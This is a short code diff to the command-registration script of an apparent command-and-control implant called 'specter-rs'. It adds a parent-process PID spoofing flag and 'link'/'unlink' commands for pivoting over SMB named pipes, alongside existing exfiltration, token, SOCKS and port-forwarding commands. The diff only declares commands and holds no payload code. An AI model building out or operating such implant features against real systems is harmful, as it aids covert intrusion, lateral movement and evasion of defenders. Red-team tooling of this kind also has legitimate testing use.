@@ -99,6 +99,7 @@ function RegisterCommands(listenerType)
     _cmd_ps_run.addArgBool("-o", "Output to console");
     _cmd_ps_run.addArgBool("-s", "Suspend process");
     _cmd_ps_run.addArgBool("-i", "Use impersonation");
+    _cmd_ps_run.addArgInt("-ppid", false, "Spoof parent process PID (0 = inherit)");
     _cmd_ps_run.addArgString("args", true);
     let cmd_ps = ax.create_command("ps", "Process manager");
     cmd_ps.addSubCommands([_cmd_ps_list, _cmd_ps_kill, _cmd_ps_run]);
@@ -141,8 +142,12 @@ function RegisterCommands(listenerType)
     let cmd_terminate = ax.create_command("terminate", "Terminate the session");
     cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);
 
+    let cmd_link = ax.create_command("link", "Link to an SMB named-pipe pivot (check-in goes through the pipe)", "link \\\\host\\pipe\\specter", "Task: link pivot");
+    cmd_link.addArgString("pipe", true, "Named pipe path (\\\\.\\pipe\\... or \\\\host\\pipe\\...)");
+    let cmd_unlink = ax.create_command("unlink", "Unlink the SMB pivot, back to direct HTTP", "unlink", "Task: unlink pivot");
+
     if(listenerType == "BeaconHTTP") {
-        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_tkn, cmd_socks, cmd_lportfwd, cmd_rportfwd, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
+        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_tkn, cmd_socks, cmd_lportfwd, cmd_rportfwd, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate, cmd_link, cmd_unlink]);
         return { commands_windows: commands_http }
     }
 
